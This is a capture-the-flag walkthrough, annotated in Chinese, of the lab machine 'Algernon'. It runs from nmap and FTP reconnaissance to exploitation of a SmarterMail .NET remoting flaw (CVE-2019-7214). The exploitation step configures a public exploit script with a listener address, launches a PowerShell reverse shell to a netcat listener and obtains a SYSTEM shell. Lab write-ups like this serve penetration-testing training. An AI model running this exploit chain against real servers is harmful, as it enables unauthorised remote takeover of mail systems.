# Algernon
![image](https://hackmd.io/_uploads/B1WUVl3h1l.png)

## Solution
### 1. Recon
#### 1.1 Nmap
```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -T4 -p- 192.168.133.65       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-22 02:26 EDT
Warning: 192.168.133.65 giving up on port because retransmission cap hit (6).
Stats: 0:05:32 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 44.12% done; ETC: 02:39 (0:07:00 remaining)
Nmap scan report for 192.168.133.65
Host is up (0.096s latency).
Not shown: 65486 closed tcp ports (reset), 35 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 03-21-25  11:25PM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_04-29-20  10:32PM       <DIR>          Spool
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
9998/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
|_http-server-header: Microsoft-IIS/10.0
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Sat, 22 Mar 2025 06:42:18 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
17001/tcp open  remoting      MS .NET Remoting services
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-22T06:42:18
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 943.43 seconds
```
> Http, ftp, netbios

http://192.168.133.65/\
![image](https://hackmd.io/_uploads/ryCf-xhhke.png)\
http://192.168.133.65:9998/interface/root#/login\
![image](https://hackmd.io/_uploads/SJqIbln2kl.png)

#### 1.2 Dirb
```
┌──(chw㉿CHW)-[~]
└─$ dirb http://192.168.133.65/         
...
==> DIRECTORY: http://192.168.133.65/aspnet_client/         
...
==> DIRECTORY: http://192.168.133.65/aspnet_client/system_web/ 
...
```
> 沒有訊息

### 2. ftp
```
┌──(chw㉿CHW)-[~]
└─$ ftp anonymous@192.168.133.65 21
Connected to 192.168.133.65.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49762|)
150 Opening ASCII mode data connection.
04-29-20  10:31PM       <DIR>          ImapRetrieval
03-22-25  01:10AM       <DIR>          Logs
04-29-20  10:31PM       <DIR>          PopRetrieval
04-29-20  10:32PM       <DIR>          Spool
```
> 檔案太多，可以直接 wget 到本機

```
┌──(chw㉿CHW)-[~]
└─$ wget -r ftp://Anonymous@192.168.133.65
...
┌──(chw㉿CHW)-[~]
└─$ cd 192.168.133.65                    
                                                          
┌──(chw㉿CHW)-[~/192.168.133.65]
└─$ ls
ImapRetrieval  Logs  PopRetrieval  Spool

┌──(chw㉿CHW)-[~/192.168.133.65]
└─$ tree                                                                                       
.
├── ImapRetrieval
├── Logs
│   ├── 2020.04.29-delivery.log
│   ├── 2020.04.29-profiler.log
│   ├── 2020.04.29-smtpLog.log
│   ├── 2020.04.29-xmppLog.log
│   ├── 2020.05.12-administrative.log
│   ├── ...
│   ├── 2025.01.06-xmppLog.log
│   └── 2025.03.22-delivery.log
├── PopRetrieval
└── Spool
    └── Drop

```
### 3. 分析 log
```
┌──(chw㉿CHW)-[~/192.168.133.65]
└─$ cd Logs

┌──(chw㉿CHW)-[~/192.168.133.65/Logs]
└─$ cat * 
...
23:26:57.040 xmpp Stopped at 4/29/2020 11:26:57 PM
03:35:45.726 [192.168.118.6] User @ calling create primary system admin, username: admin
03:35:47.054 [192.168.118.6] Webmail Attempting to login user: admin
03:35:47.054 [192.168.118.6] Webmail Login successful: With user admin
03:35:55.820 [192.168.118.6] Webmail Attempting to login user: admin
03:35:55.820 [192.168.118.6] Webmail Login successful: With user admin
03:36:00.195 [192.168.118.6] User admin@ calling set setup wizard settings
03:36:08.242 [192.168.118.6] User admin@ logging out
...
```
> 發現 Webmail user: admin

### 4. searchsploit
因為沒有找到 Smartermail 版本，先瀏覽可能的 exploit 內容
```
┌──(chw㉿CHW)-[~/192.168.133.65/Logs]
└─$ searchsploit Smartermail
--------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                           |  Path
--------------------------------------------------------------------------------------------------------- ---------------------------------
SmarterMail 16 - Arbitrary File Upload                                                                   | multiple/webapps/48580.py
SmarterMail 7.1.3876 - Directory Traversal                                                               | windows/remote/15048.txt
SmarterMail 7.3/7.4 - Multiple Vulnerabilities                                                           | asp/webapps/16955.txt
SmarterMail 8.0 - Multiple Cross-Site Scripting Vulnerabilities                                          | asp/webapps/16975.txt
SmarterMail < 7.2.3925 - LDAP Injection                                                                  | asp/webapps/15189.txt
SmarterMail < 7.2.3925 - Persistent Cross-Site Scripting                                                 | asp/webapps/15185.txt
SmarterMail Build 6985 - Remote Code Execution                                                           | windows/remote/49216.py
SmarterMail Enterprise and Standard 11.x - Persistent Cross-Site Scripting                               | asp/webapps/31017.php
...
```
> 嘗試 49216
> `SmarterMail .NET Remoting RCE (CVE-2019-7214)`

查看 exploit 使用方法：
```
┌──(chw㉿CHW)-[~/192.168.133.65/Logs]
└─$ searchsploit -x 49216   
  Exploit: SmarterMail Build 6985 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/49216
     Path: /usr/share/exploitdb/exploits/windows/remote/49216.py
    Codes: CVE-2019-7214
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (4852)
# Exploit Title: SmarterMail Build 6985 - Remote Code Execution
# Exploit Author: 1F98D
# Original Author: Soroush Dalili
# Date: 10 May 2020
# Vendor Hompage: re
# CVE: CVE-2019-7214
# Tested on: Windows 10 x64
# References:
# https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/
#
# SmarterMail before build 6985 provides a .NET remoting endpoint
# which is vulnerable to a .NET deserialisation attack.
#
#!/usr/bin/python3

```

### 5. Exploit
編輯 exploit
```
┌──(chw㉿CHW)-[~/192.168.133.65]
└─$ cat 49216.py 
...

import base64
import socket
import sys
from struct import pack

HOST='192.168.133.65'
PORT=17001
LHOST='192.168.45.165'
LPORT=8888

psh_shell = '$client = 
...

┌──(chw㉿CHW)-[~/192.168.133.65]
└─$ python3 49216.py
```
(Kali)
```
┌──(chw㉿CHW)-[~/192.168.133.65]
└─$ nc -nvlp 8888
listening on [any] 8888 ...

connect to [192.168.45.165] from (UNKNOWN) [192.168.133.65] 50020
PS C:\Windows\system32> hostname
algernon
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> 

```

### ✅ Get Root FLAG
> 在 `C:\Users\Administrator\Desktop`找到 Root flag
